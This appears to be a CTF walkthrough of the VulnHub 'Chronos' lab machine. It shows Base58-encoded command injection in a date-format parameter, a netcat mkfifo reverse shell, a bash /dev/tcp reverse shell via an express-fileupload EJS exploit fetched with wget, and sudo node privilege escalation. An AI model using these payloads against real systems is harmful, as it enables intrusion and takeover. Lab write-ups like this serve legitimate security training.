@@ -1,0 +1,142 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Chronos Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/chronos-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-12-11T22:31:05+00:00">December 11, 2021</time><time class="updated" datetime="2025-07-07T17:42:19+00:00">July 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;"><strong><a href="https://www.vulnhub.com/entry/chronos-1,735/">Chronos</a> </strong>is an easy/medium machine from Vulnhub by AL1ENUM. This machine is also tested in VirtualBox. This lab is suitable for novices because it has significant bugs such as Remote Command Execution for reverse connection and a privilege escalation approach. So, let’s get started and learn how to break things down into manageable pieces.</span></p>
+<h3><span style="color: #800000;"><strong>Methodology</strong></span></h3>
+<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">netdiscover</span></li>
+<li><span style="color: #000000;">nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing HTTP</span></li>
+<li><span style="color: #000000;">Intercept HTTP request</span></li>
+<li><span style="color: #000000;">Decode Base64 and Base58</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Inject Netcat reverse shell</span></li>
+<li><span style="color: #000000;">Sensitive data exposure (express-file upload)</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Exploiting file express upload</span></li>
+<li><span style="color: #000000;">Capture the root flag </span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Level: Easy-Medium</strong></span></p>
+<p><span style="color: #000000;"><strong>Flags concurred:</strong></span></p>
+<p><span style="color: #000000;"><strong>root.txt: YXBvcHNlIHNpb3BpIG1hemV1b3vtZSBvbmVpcmEK </strong></span></p>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">Firstly, we have to scan the network to find the Victim machine IP using the netdiscover command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">netdiscover</pre>
+<p><span style="color: #000000;">The IP address we get is<strong> 192.168.1.174</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgH0cQc1k0ymb9JXhjkJRUt6zmocFHgeD8UzMjIJOBVsoG33zuyiU3k5NwLf6LAkhpbh-ofZi4u3UaQGJsz2yiwp44m-Bwt3XISMPc73DoWinM-Y-QUracQ4TMCEpD-GNV3joBxyn9lAapChmPrbQB1II0WZys5yJQpPhFcw3ma0R3GPRQllRAC3M7izw=s16000"/></span></p>
+<h3><span style="color: #800000;"><strong>Nmap </strong></span></h3>
+<p><span style="color: #000000;">Further, we ran an aggressive scan (-A) for open port enumeration where we found the following port details:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 192.168.1.174</pre>
+<p><span style="color: #000000;">According to the Nmap output, we get</span></p>
+<ul>
+<li><span style="color: #000000;">on port 22 SSH server running</span></li>
+<li><span style="color: #000000;">on port 80 HTTP service running (Apache Server)</span></li>
+</ul>
+<ul>
+<li><span style="color: #000000;">on port 8000 HTTP service running (Node.js Express framework)</span></li>
+</ul>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjhSZhh_nCWo87Smf_gjIgH2nb80AGZaGnaVaBviRQajpKXN9S1H7FP3EoeuWXf2zGAoqwY_Cvk_ulHhVU6gDZej1iqlcnRekWvYpouB6BdRERDDftU5vGhkbHmkHMmLXoZOWL45IRlRSVrkikYAVRYW6c4Fe5hIjEMsSOuTcBbnvsRdXRozqVK6OQE8w=s16000"/></strong></span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;"><strong><u>Abusing </u></strong><strong><u>HTTP </u></strong></span></p>
+<p><span style="color: #000000;">Let’s check port 80 to see if we get anything interesting. We can verify it immediately in the browser because the Apache Server is running on port 80.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhia3BpSfvJs8DlLedC_qi1-JmtXS6nHnKM46Qn95EUITQPPZpkSrD5-KfhNqPE1ChvMaX3zBg05G5bxgAxar2aoTJ-s68R2LdiJ5yMKCg2K7vWbemctpBUze1JSb15l3qqkCz0yEb_oUr-nNOkmMqD2vmQ_u1tWwi2GRci9FJR_0bIG5c0S5tSvSQUOA=s16000"/></span></p>
+<p><span style="color: #000000;">The site does not provide any valuable information, therefore we go for the source page that exposes <strong>hostnames </strong>and <strong>URL</strong>. Since the hostname has not been included in our /etc/hosts configuration file, we cannot route.</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEio8_49lglGnu192hcOGrtvABCStbkoAV3hGWLZSdR00LCCi7VQTm_8rbAIQIW4DravfM0QaNUZ4Hx1_7bWGkUZoGF7CZ41r1YEYS0-8Qc0GsLaUtRra7-8eFoFBGRG9keYSL9KDSRxy0A1podRUCAISy1X0-my_ldoAX6Iljjq0y_57n8lsWQuAyY72g=s16000"/></strong></span></p>
+<p><span style="color: #000000;">Therefore, we have updated the/etc/hosts file by adding the IP and hostname as shown in the image.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.1.174 chronos.local</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEibwQfRzgG56YC0EE-ydVdUZ-wXp8ze2WvE0qz-UlPG64LeJA9jc8cRK4szwEAVm3vX2vx1XMPl6s0GH6agb94sOBCE8OsUtejYLIFRpTgknQP37xXhy0WhtBSAZfYa19SsdUjtgxugEZI-brxiTHp_YkkCEgJvIONpsAK9DeROOzdeb7ad5JGYDM7P7Q=s16000"/></span></p>
+<p><span style="color: #000000;">By browsing <strong>http://chronos.local:8000</strong>, the site response by showing time, day &amp; date.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjnBEZHY6bSMB6sJhIwdxhkV9ow6SBAesAqITS0GkkV-wUuXqgyCdFZoL5p4lNCUUBX-2ptlUDDT0co0ROurXjG6qnaAhCy56KNfbwzNBEZRv1R1W4Fl6V8DDftuPJCTVC6_r0aXQOa5iEkd7rHRjTStIVY-35mcSp_v7EcrbOBCgGA-xrBhgCMmgpz0Q=s16000"/></span></p>
+<p><span style="color: #000000;">The URL of the above-mentioned source page was visited this time; however, the server responded with the message “permission denied.” </span><span style="color: #000000;">So we decided to intercept HTTP requests for this page through the burp suite.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj2cX4tfyuaLqPr-FOFFXIg3ikuPZnmjF1h56yYlh7PCL2giqiH9SI1aKHXox63iI11nXXCQ8y-M2Pur6S9RJdckJwhg8yKcHCSSY5jkAraWeYdjXRH90pTPUovOD3NkDZQqVHUDdoN9bURHJtN8J_b6WSMdghGfaWGmdxPSRPumwcmRVmEwg5MkjQXdQ=s16000"/></span></p>
+<p><span style="color: #000000;"><strong><u>Decode Base64 and Base58</u></strong></span></p>
+<p><span style="color: #000000;">We intercepted the HTTP request for the GET method, which includes a format parameter with a bas64-encoded argument.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhtEuVYOm1MDFCyyE5YEGaM525v6lm3u1UY4WWIz-9O396XcnDcv-v8Yku_yLJNq96f5dMpl_Lf0xTFk-CVJh9rkHgzSZp8MTqHZYkrZjpRMC590p3_1G2zM68fR6hw4M6FOMk-PuucGIbMDgT6SBH73euno41Qrs8CtWbs94segrBUO2engryWRtZ8rw=s16000"/></span></p>
+<p><span style="color: #000000;">Copy the argument value and paste it into the CyberChef to encode it into base64</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</pre>
+<p><span style="color: #000000;">The output we get from the encoding the value looks like this</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">NHVnWUR1QWtTY0NHNWdNY1pqRU4zbUFMeUcxZEQ1WllzaUNmV3ZRMnc5YW5ZR3lM</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgm1xxqIv0TfSuXaBZV4lkmKT6mf1I0O33yfkp8TPpXjlCN_UQSbQAWsbkksioROG1ypDYdI09pP0CmU_5C_tSRAfvQrXxdLu7yV_7muEyKUZUSS0plhJ6iyZNzN-2lDUeO6qZ81FAqgeoTTKtcTOnqKsREx2VDe4beE70pzzXYAgHAieSBBsAx0PqneA=s16000"/></strong></span></p>
+<p><span style="color: #000000;">Now it’s time to experiment with the repeater; let’s copy the output (base64) and request it over the repeater. For the provided base64 parameter, we received an error message for a non-base58 character, indicating that the server is encoding and decoding using the base58 function.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjnrb_dGbp8vtEtL39_YZD5a7rEip8iANypa-Nr9biV-EhgkZ8gPwNEKQETCT9G6qT-YXO5XNfG4OJBPT_ts2xsroHkwErmp9R-n5h-58aoEo6n1-rWTLsLolcO8zslvMV-v6Oy-64fkQT3slSiM4xg2NTUKxEerhyPwMZ1aofR0W8jn4Erf4G2xmU-Bw=s16000"/></span></p>
+<p><span style="color: #000000;">Copy the same parameter format value and decode it with Base58.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</pre>
+<p><span style="color: #000000;">The outcome we get after decoding for the format value is day, date and time as an argument.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">'+Today is %A, %B %d, %Y %H:%M:%S.'</pre>
+<p><span style="color: #000000;"><strong><em>Key Point: The application is calling OS functionality to execute time and date command, which means format parameter can fuzz for os command injection. Here you can try to execute any base64_encoded arbitrary system command.</em></strong></span></p>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjIxoBWRAoW382-U0-i0S6382BiNF8JJLbswTwzsWZpY1ofRd4YyXv-P80MoVm43Mu-txgFDXG6s_dUFpYX3Omw6ActaHCMuxeOwVeFBkFuCjvSlPpD3a9jyLcvOwuHOG-ohE4H0l7HBVDiEmd4bUbQ4urA3nu1xU6Gxwkm2EOsuhBaxabRTOQW7cLN3g=s16000"/></strong></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation </strong></span></h3>
+<p><span style="color: #000000;"><strong><u>Inject Netcat one-liner payload</u></strong></span></p>
+<p><span style="color: #000000;">It’s time to exploit remote command execution by injecting a netcat reverse shell. You can visit the given link to get the netcat reverse shell one-liner and modify the payload according to listener address and port.</span></p>
+<p><span style="color: #000000;"><strong>URL: <a style="color: #000000;" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a> </strong></span></p>
+<p><span style="color: #000000;">Use the following command to make sure to change the IP.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.1.3 1234 &gt;/tmp/f</pre>
+<p><span style="color: #000000;">Copy the payload which we have created earlier and use Base58 to encrypt this payload.</span></p>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEicEhhoSFh4KI6kU3RL-Sg8wJ2erjOu0xo4mrASjQN_TMmon-Rk5RdhI-vPcVRjc-Hm57LxDSYyF0jSfss5XF7bHB59aBzhpNgL7D9rUpgWjavkK1D4yfMjAwMTKT-F1dulNnuwrx-_UOFFBtduWcJnIWhxVeXBhi7BCDxFFZeR4vADmOCBxmytVockJQ=s16000"/></strong></span></p>
+<p><span style="color: #000000;">Start a Netcat listener on port 1234 for obtaining a reverse connection.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234</pre>
+<p><span style="color: #000000;">Modify the format value by injecting an encrypted payload and sending the request to the server.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjBR6z3wPWl9molcmivo1C_BwO111UpF4UbAVPMtQnV20iVEYcuch9Pc9ewOLR9up2RfHdHCjVvwwTdV_6wdlCI1cCSeQooziMTZ0yRBTw9u9CLabT-eB32BbvxNXABgxVSgrSGw2VmYssgIjGABMXa_efqgwpPbwnBlSy4sj7jgWbJ8BJRLGvHHekokw=s16000"/></span></p>
+<p><span style="color: #000000;">As soon as we deliver the payload we get the reverse in our Netcat listener.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd
+ls</pre>
+<p><span style="color: #000000;"><strong><u>Sensitive data exposure (express-fileupload) </u></strong></span></p>
+<p><span style="color: #000000;">For post enumeration, we dig there are two folders in the opt directory<strong>: “chronos” and “chronos-v2”.</strong> We get into the chronos-v2 directory has further two new folders in chronos-v2: <strong>“frontend” and “backend.”</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd chronos-v2
+ls
+cd backend</pre>
+<p><span style="color: #000000;">We got four scripts inside the backend directory: <strong>“node modules”, “package.json”, “package-lock.json”, “server.js”</strong></span></p>
+<p><span style="color: #000000;">Now we can see a service called <strong>“express-fileupload version 1.1.7”</strong> in the package.json file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls
+cat package.json</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjmo8qdhZVq0pkBVq_6p3ZqRSKI41v0T61I0OwBo8-mnidqK8XlNlGFw5ivSXRKjcLKcAFuSNvAX8MyM0badg9WSscAZaMuXBQDqB7HnD1shufQh2rGRC5Lh0Syfc6yuane0bZs_i-JEOaYjtXPez8iss6bCE4Buzaxq6lkMKSF847JL69rCt7gRCAPNA=s16000"/></strong></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">We can see from package.json that the server is running express-fileupload version 1.1.9-alpa.3 for Node.js, therefore let’s look for any probable exploits on Google.</span></p>
+<p><span style="color: #000000;">Luckily we found a python script to perform an EJS-RCE attack to exploit express-fileupload.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh8Xd7y3pnGLlv0aHAh-JHIfbLZeNJCATsg42Lgw4EQtI78a6pPhSK8jDy5EVQcJtY48PQ4WXJas7F4c52Vp2qzcBsRBIUjj367t4Br_D32giJhlCenbcU3BexyTj3a2Uh95NmbDM-juRHmYVFLlEI17ZJoRNrvI8iPurzQum2L4qnpA_3ewjcznzBAcw=s16000"/></span></p>
+<p><span style="color: #000000;"><strong><u>Exploiting Express Fileupload</u></strong></span></p>
+<p><span style="color: #000000;">Go to the website, download the exploit and make the changes in the host IP (Kali Machine) file and then name the file as <strong>poc.py </strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">'bash -c "bash -i &amp;&gt; /dev/TCP/192.168.1.3/8888 0&gt;&amp;1" '</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjeqrT0mcUed3QRdyT1OgKh2qmvJdzXmgaXkeflBxh6_P-QT5pgpn_FTeisbB-3y928VtMYfn7IaBkfxkOhl9MVwC186XsdJg3Xwpa8swfcUsq_bSWl0NFvZRCPTJKBf9D1qW42pVUMl0P_WOwnKpIEU2YphsxS9LdRpLPHshz9BFs9HtLKW3nhSpTkkg=s16000"/></span></p>
+<p><span style="color: #000000;">There is a need to transfer this exploit so, launch the Python server with the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiLY09oTeDOIA1Pz3d6ibYD1EUj3Nv_LBLKOabzSjcshmLLkrV3p3nbSn3eU0XnNVqqHdxlFq2VYmheMIczur8fMM_Qvvf6uPuSDLRPkNK1OqmX5Oz_1gDBmyOUx7-FUVi6cKktPPpN51lVJX08y3wqMksTMxZd-MCk0CJZvONPc9bnxcBiu3YIYGIrDw=s16000"/></span></p>
+<p><span style="color: #000000;">Let’s start the Netcat listener on new port 8888.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 8888</pre>
+<p><span style="color: #000000;">Now, download the created exploit using “wget” in the tmp folder</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
+wget http://192.168.1.3/poc.py</pre>
+<p><span style="color: #000000;">Once it is downloaded, now run the exploit with the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 poc.py</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgVWyXT57qXJx1XgkjganmbhkNJvkQTWVucl5tu_H1UyQ7-GoROp-VjccjgCklCfMA18hz0wa7wn-0Zl9Ux_28YQ0Zs3Kv2va6F6lH6GnTmzSvcQJbhvNPWH8kgAmLrIxzhqsYFqpuM7_-VFPTJhJMKoMv0kDY6CRL1ETC--m2DZFP45hx4yvG1CFYUpA=s16000"/></span></p>
+<p><span style="color: #000000;"><strong><u>Capture the root flag </u></strong></span></p>
+<p><span style="color: #000000;">We receive the limited privilege shell on our Listener as soon as we run the exploit.</span></p>
+<p><span style="color: #000000;">Now for privilege escalation, let’s find out sudo rights for user “imera’. We found the user imera has ALL privileges to run two program node &amp; npm.</span></p>
+<p><span style="color: #000000;">I did a quick search and got to know that we can use Using “child_process.spawn” method to run a bash script. This bash script will give us the root shell if it gets executed properly. From</span></p>
+<p><strong>GTFOBin</strong>: <span style="color: #0000ff;"><strong>https://gtfobins.github.io/gtfobins/node/</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic"> sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'</pre>
+<p><span style="color: #000000;">As soon as the script is getting executed, we get the root shell. Check the id and enter in the root directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">id
+cd /root</pre>
+<p><span style="color: #000000;">we can see the root.txt file just open the file and you will get the root flag.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls
+cat root.txt</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiFMkP_rSlgI_0fxIZDe8bmHmFD9HPm2NNEhjIOHbZcEgWeTm-HK03G6bjMdPKpdLRJ2XQinS_6CwnInkJQ8CcyLkDdb91qTFfsRDSutz6RGO2-YrgqPENFlAxyojazNlxk6R4IHd8xwTp7wu5hkZkm7jkwWBeSEs4HNxLEqpUx89WkQnAIBWWQJcKFLg=s16000"/></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more VulnHub Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Sakshi Gurao is a Researcher and Technical Writer at Hacking Articles, Red Teamer, Penetration Tester. Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/sakshi-gurao">Linkedin</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
